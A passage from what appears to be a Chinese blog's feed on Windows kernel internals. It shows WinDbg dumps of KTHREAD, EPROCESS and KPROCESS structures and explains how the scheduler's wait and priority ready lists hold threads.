的结构体地址，然后输出它的 data 字段，可以看到 <code>WaitListHead</code> 链表和 <code>DispatcherReadyListHead</code> 的 32 个链表。</p><p>这里验证一下，如果线程挂在 WaitListHead 中，那么线程状态应该是 <code>waiting</code> 状态的，观察 <code>KTHREAD</code> 字段说明，可以得到。</p><table><thead><tr><th>值</th><th>状态</th><th>描述</th></tr></thead><tbody><tr><td>0x00</td><td><strong>Initialized</strong></td><td>线程已初始化，但尚未开始运行。</td></tr><tr><td>0x01</td><td><strong>Ready</strong></td><td>线程处于就绪状态，可以被调度器分配给处理器执行。</td></tr><tr><td>0x02</td><td><strong>Running</strong></td><td>线程正在处理器上运行。</td></tr><tr><td>0x03</td><td><strong>Standby</strong></td><td>线程已被选择为下一个执行的线程，等待处理器空闲。</td></tr><tr><td>0x04</td><td><strong>Terminated</strong></td><td>线程已终止，正在清理资源。</td></tr><tr><td>0x05</td><td><strong>Waiting</strong></td><td>线程正在等待某个事件或资源（如 I&#x2F;O、同步对象）。</td></tr><tr><td>0x06</td><td><strong>Transition</strong></td><td>线程处于等待状态，但缺少必要的资源（例如尚未加载到内存的线程堆栈）。</td></tr><tr><td>0x07</td><td><strong>DeferredReady</strong></td><td>线程曾处于等待状态，现在已准备好执行，但调度尚未发生。</td></tr><tr><td>0x08</td><td><strong>GateWaitObsolete</strong></td><td>该状态已过时，仅用于向后兼容旧版 Windows。</td></tr></tbody></table><p>那么理论上来说，上面的线程 <code>State</code> 字段取值应该为 5。</p><p>取得 Flink 上的值 <code>0x884ded7c</code>，因为该字段在 <code>KTHREAD+0x74</code> 中，而指针一般都指向对应的链表字段，所以需要将地址 -0x74，下面给出输出的部分数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD <span class="number">884</span>ded7c<span class="number">-0x74</span></span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   <span class="number">+0x028</span> InitialStack     : <span class="number">0x80fb2ed0</span> Void</span><br><span class="line">   <span class="number">+0x02c</span> StackLimit       : <span class="number">0x80fb0000</span> Void</span><br><span class="line">   <span class="number">+0x030</span> KernelStack      : <span class="number">0x80fb2a60</span> Void</span><br><span class="line">   <span class="number">+0x034</span> ThreadLock       : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x038</span> WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   <span class="number">+0x039</span> Running          : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x03a Alerted          : [2]  &quot;&quot;</span></span><br><span class="line"><span class="string">   +0x03c Alertable        : 0y1</span></span><br><span class="line"><span class="string">   +0x057 Priority         : 12 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x058</span> NextProcessor    : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x05c</span> DeferredProcessor : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x060</span> ApcQueueLock     : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x064</span> ContextSwitches  : <span class="number">4</span></span><br><span class="line">   <span class="number">+0x068</span> State            : <span class="number">0x5</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x069 NpxState         : 0 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x06a</span> WaitIrql         : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x06b WaitMode         : 1 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x06c</span> WaitStatus       : <span class="number">0</span>n0</span><br><span class="line">   <span class="number">+0x070</span> WaitBlockList    : <span class="number">0x884dedc8</span> _KWAIT_BLOCK</span><br><span class="line">   <span class="number">+0x074</span> WaitListEntry    : _LIST_ENTRY [ <span class="number">0x883ac92c</span> - <span class="number">0x80b9a300</span> ]</span><br><span class="line">   <span class="number">+0x074</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>可以看到对应上了基本，线程优先级 12，线程状态 5（Waiting）。</p><h3 id="调度链表"><a href="#调度链表" class="headerlink" title="调度链表"></a>调度链表</h3><p>调度链表有 32 个圈，就是优先级是 <code>0-31</code>，0为最低优先级，31 为最高，默认优先级一般是 8。改变优先级就是从一个圈里面卸下来挂到另外一个圈上，这 32 个圈是正在调度中的线程，包括准备运行的线程（Ready）。比如：只有一个 <code>CPU</code> 但有10 个线程在运行，那么某一时刻，正在运行的线程在 <code>KPCR</code> 的 <code>data</code> 中，其他 9 个在这 32 个圈中。</p><p>调度链表不包括正在运行的线程这一点是可以肯定的，可以做如下实验：</p><ol><li>找到 KPCR 的 CurrentThread，查看对应的优先级</li><li>从根据优先级找到对应的调度链表，发现对应优先级的链表为空。</li></ol><img src="/2025/01/24/WindowsProcess2/1.png" class=""><p>然后查看对应的调度链表</p><img src="/2025/01/24/WindowsProcess2/2.png" class=""><p>发现为空，可以说明，正在运行的线程不会出现在调度链表中，而是直接挂在 KPCR 的 <code>CurrentThread</code> 字段。</p><hr><p>通过学习这两个结构，也可以得出一个结论了：</p><p>线程调度是基于线程，也依赖等待链表和调度链表的，不管如何断链隐藏，遍历这两个链表一定能遍历得到真实的所有线程。如果尝试把线程从这两个链表断开，那么这个线程就永远不会被调度，也就永远跑不起来了，这背离了我们隐藏线程的初衷。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15787751.html">https://www.cnblogs.com/wingsummer/p/15787751.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下调度相关的结构</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——基本结构</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsProcess1/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsProcess1/</id>
    <published>2025-01-24T06:00:00.000Z</published>
    <updated>2025-01-27T07:09:13.435Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下进程与线程的结构</p><span id="more"></span><h2 id="EPROCESS"><a href="#EPROCESS" class="headerlink" title="EPROCESS"></a>EPROCESS</h2><h3 id="定义描述"><a href="#定义描述" class="headerlink" title="定义描述"></a>定义描述</h3><p>先来看看结构体的描述</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   <span class="number">+0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   <span class="number">+0x098</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x0a0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x0a8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x0b0</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   <span class="number">+0x0b4</span> UniqueProcessId  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0b8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x0c0</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint4B</span><br><span class="line">   <span class="number">+0x0c8</span> ProcessQuotaPeak : [<span class="number">2</span>] Uint4B</span><br><span class="line">   <span class="number">+0x0d0</span> CommitCharge     : Uint4B</span><br><span class="line">   <span class="number">+0x0d4</span> QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   <span class="number">+0x0d8</span> CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   <span class="number">+0x0dc</span> PeakVirtualSize  : Uint4B</span><br><span class="line">   <span class="number">+0x0e0</span> VirtualSize      : Uint4B</span><br><span class="line">   <span class="number">+0x0e4</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x0ec</span> DebugPort        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0f0</span> ExceptionPortData : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0f0</span> ExceptionPortValue : Uint4B</span><br><span class="line">   <span class="number">+0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   <span class="number">+0x0f8</span> Token            : _EX_FAST_REF</span><br><span class="line">   <span class="number">+0x0fc</span> WorkingSetPage   : Uint4B</span><br><span class="line">   <span class="number">+0x100</span> AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x104</span> RotateInProgress : Ptr32 _ETHREAD</span><br><span class="line">   <span class="number">+0x108</span> ForkInProgress   : Ptr32 _ETHREAD</span><br><span class="line">   <span class="number">+0x10c</span> HardwareTrigger  : Uint4B</span><br><span class="line">   <span class="number">+0x110</span> PhysicalVadRoot  : Ptr32 _MM_AVL_TABLE</span><br><span class="line">   <span class="number">+0x114</span> CloneRoot        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x118</span> NumberOfPrivatePages : Uint4B</span><br><span class="line">   <span class="number">+0x11c</span> NumberOfLockedPages : Uint4B</span><br><span class="line">   <span class="number">+0x120</span> Win32Process     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x124</span> Job              : Ptr32 _EJOB</span><br><span class="line">   <span class="number">+0x128</span> SectionObject    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x12c</span> SectionBaseAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x130</span> Cookie           : Uint4B</span><br><span class="line">   <span class="number">+0x134</span> Spare8           : Uint4B</span><br><span class="line">   <span class="number">+0x138</span> WorkingSetWatch  : Ptr32 _PAGEFAULT_HISTORY</span><br><span class="line">   <span class="number">+0x13c</span> Win32WindowStation : Ptr32 Void</span><br><span class="line">   <span class="number">+0x140</span> InheritedFromUniqueProcessId : Ptr32 Void</span><br><span class="line">   <span class="number">+0x144</span> LdtInformation   : Ptr32 Void</span><br><span class="line">   <span class="number">+0x148</span> VdmObjects       : Ptr32 Void</span><br><span class="line">   <span class="number">+0x14c</span> ConsoleHostProcess : Uint4B</span><br><span class="line">   <span class="number">+0x150</span> DeviceMap        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x154</span> EtwDataSource    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x158</span> FreeTebHint      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x160</span> PageDirectoryPte : Uint8B</span><br><span class="line">   <span class="number">+0x168</span> Session          : Ptr32 Void</span><br><span class="line">   <span class="number">+0x16c</span> ImageFileName    : [<span class="number">15</span>] UChar</span><br><span class="line">   <span class="number">+0x17b</span> PriorityClass    : UChar</span><br><span class="line">   <span class="number">+0x17c</span> JobLinks         : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x184</span> LockedPagesList  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x188</span> ThreadListHead   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x190</span> SecurityPort     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x194</span> PaeTop           : Ptr32 Void</span><br><span class="line">   <span class="number">+0x198</span> ActiveThreads    : Uint4B</span><br><span class="line">   <span class="number">+0x19c</span> ImagePathHash    : Uint4B</span><br><span class="line">   <span class="number">+0x1a0</span> DefaultHardErrorProcessing : Uint4B</span><br><span class="line">   <span class="number">+0x1a4</span> LastThreadExitStatus : Int4B</span><br><span class="line">   <span class="number">+0x1a8</span> Peb              : Ptr32 _PEB</span><br><span class="line">   <span class="number">+0x1ac</span> PrefetchTrace    : _EX_FAST_REF</span><br><span class="line">   <span class="number">+0x1b0</span> ReadOperationCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1b8</span> WriteOperationCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1c0</span> OtherOperationCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1c8</span> ReadTransferCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1d0</span> WriteTransferCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1d8</span> OtherTransferCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1e0</span> CommitChargeLimit : Uint4B</span><br><span class="line">   <span class="number">+0x1e4</span> CommitChargePeak : Uint4B</span><br><span class="line">   <span class="number">+0x1e8</span> AweInfo          : Ptr32 Void</span><br><span class="line">   <span class="number">+0x1ec</span> SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">   <span class="number">+0x1f0</span> Vm               : _MMSUPPORT</span><br><span class="line">   <span class="number">+0x25c</span> MmProcessLinks   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x264</span> HighestUserAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x268</span> ModifiedPageCount : Uint4B</span><br><span class="line">   <span class="number">+0x26c</span> Flags2           : Uint4B</span><br><span class="line">   <span class="number">+0x26c</span> JobNotReallyActive : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AccountingFolded : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> NewProcessReported : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ExitProcessReported : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ReportCommitChanges : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> LastReportMemory : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ReportPhysicalPageChanges : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> HandleTableRundown : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> NeedsHandleRundown : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> RefTraceEnabled  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> NumaAware        : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ProtectedProcess : Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> DefaultPagePriority : Pos <span class="number">12</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x26c</span> PrimaryTokenFrozen : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ProcessVerifierTarget : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> StackRandomizationDisabled : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AffinityPermanent : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AffinityUpdateEnable : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> PropagateNode    : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ExplicitAffinity : Pos <span class="number">21</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> Spare1           : Pos <span class="number">22</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ForceRelocateImages : Pos <span class="number">23</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> DisallowStrippedImages : Pos <span class="number">24</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> LowVaAccessible  : Pos <span class="number">25</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> RestrictIndirectBranchPrediction : Pos <span class="number">26</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AddressPolicyFrozen : Pos <span class="number">27</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> SpeculativeStoreBypassDisable : Pos <span class="number">28</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Flags            : Uint4B</span><br><span class="line">   <span class="number">+0x270</span> CreateReported   : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> NoDebugInherit   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessExiting   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessDelete    : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Wow64SplitPages  : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> VmDeleted        : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> OutswapEnabled   : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Outswapped       : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ForkFailed       : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Wow64VaSpace4Gb  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> AddressSpaceInitialized : Pos <span class="number">10</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x270</span> SetTimerResolution : Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> BreakOnTermination : Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> DeprioritizeViews : Pos <span class="number">14</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> WriteWatch       : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessInSession : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> OverrideAddressSpace : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> HasAddressSpace  : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> LaunchPrefetched : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> InjectInpageErrors : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> VmTopDown        : Pos <span class="number">21</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ImageNotifyDone  : Pos <span class="number">22</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> PdeUpdateNeeded  : Pos <span class="number">23</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> VdmAllowed       : Pos <span class="number">24</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> CrossSessionCreate : Pos <span class="number">25</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessInserted  : Pos <span class="number">26</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> DefaultIoPriority : Pos <span class="number">27</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x270</span> ProcessSelfDelete : Pos <span class="number">30</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> SetTimerResolutionLink : Pos <span class="number">31</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x274</span> ExitStatus       : Int4B</span><br><span class="line">   <span class="number">+0x278</span> VadRoot          : _MM_AVL_TABLE</span><br><span class="line">   <span class="number">+0x298</span> AlpcContext      : _ALPC_PROCESS_CONTEXT</span><br><span class="line">   <span class="number">+0x2a8</span> TimerResolutionLink : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x2b0</span> RequestedTimerResolution : Uint4B</span><br><span class="line">   <span class="number">+0x2b4</span> ActiveThreadsHighWatermark : Uint4B</span><br><span class="line">   <span class="number">+0x2b8</span> SmallestTimerResolution : Uint4B</span><br><span class="line">   <span class="number">+0x2bc</span> TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD</span><br><span class="line">   <span class="number">+0x2c0</span> SequenceNumber   : Uint8B</span><br><span class="line">   <span class="number">+0x2c8</span> CreateInterruptTime : Uint8B</span><br><span class="line">   <span class="number">+0x2d0</span> CreateUnbiasedInterruptTime : Uint8B</span><br><span class="line">   <span class="number">+0x2d8</span> SecurityDomain   : Uint8B</span><br></pre></td></tr></table></figure><p>与 <code>ETHREAD</code> 结构同理，里面也包了一个 <code>KPROCESS</code> 结构叫进程控制块（Process Control Block，PCB）。</p><p>同样来看看该结构的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPROCESS</span><br><span class="line">nt!_KPROCESS</span><br><span class="line">   <span class="number">+0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   <span class="number">+0x010</span> ProfileListHead  : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x018</span> DirectoryTableBase : Uint4B</span><br><span class="line">   <span class="number">+0x01c</span> LdtDescriptor    : _KGDTENTRY</span><br><span class="line">   <span class="number">+0x024</span> Int21Descriptor  : _KIDTENTRY</span><br><span class="line">   <span class="number">+0x02c</span> ThreadListHead   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x034</span> ProcessLock      : Uint4B</span><br><span class="line">   <span class="number">+0x038</span> Affinity         : _KAFFINITY_EX</span><br><span class="line">   <span class="number">+0x044</span> ReadyListHead    : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x04c</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   <span class="number">+0x050</span> ActiveProcessors : _KAFFINITY_EX</span><br><span class="line">   <span class="number">+0x05c</span> AutoAlignment    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> DisableBoost     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> DisableQuantum   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> ActiveGroupsMask : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> ReservedFlags    : Pos <span class="number">4</span>, <span class="number">28</span> Bits</span><br><span class="line">   <span class="number">+0x05c</span> ProcessFlags     : Int4B</span><br><span class="line">   <span class="number">+0x060</span> BasePriority     : Char</span><br><span class="line">   <span class="number">+0x061</span> QuantumReset     : Char</span><br><span class="line">   <span class="number">+0x062</span> Visited          : UChar</span><br><span class="line">   <span class="number">+0x063</span> Unused3          : UChar</span><br><span class="line">   <span class="number">+0x064</span> ThreadSeed       : [<span class="number">1</span>] Uint4B</span><br><span class="line">   <span class="number">+0x068</span> IdealNode        : [<span class="number">1</span>] Uint2B</span><br><span class="line">   <span class="number">+0x06a</span> IdealGlobalNode  : Uint2B</span><br><span class="line">   <span class="number">+0x06c</span> Flags            : _KEXECUTE_OPTIONS</span><br><span class="line">   <span class="number">+0x06d</span> AddressPolicy    : UChar</span><br><span class="line">   <span class="number">+0x06e</span> IopmOffset       : Uint2B</span><br><span class="line">   <span class="number">+0x070</span> Unused4          : Uint4B</span><br><span class="line">   <span class="number">+0x074</span> StackCount       : _KSTACK_COUNT</span><br><span class="line">   <span class="number">+0x078</span> ProcessListEntry : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x080</span> CycleTime        : Uint8B</span><br><span class="line">   <span class="number">+0x088</span> KernelTime       : Uint4B</span><br><span class="line">   <span class="number">+0x08c</span> UserTime         : Uint4B</span><br><span class="line">   <span class="number">+0x090</span> VdmTrapcHandler  : Ptr32 Void</span><br></pre></td></tr></table></figure><p>介绍几个相对比较重要的成员信息。</p><h3 id="成员信息"><a href="#成员信息" class="headerlink" title="成员信息"></a>成员信息</h3><ul><li>Header：可等待对象，比如Mutex互斥体，Event事件等。</li><li>DirectoryTableBase：页目录表的基址，也就是所谓的<code>CR3</code>。</li><li>LdtDescriptor &#x2F; 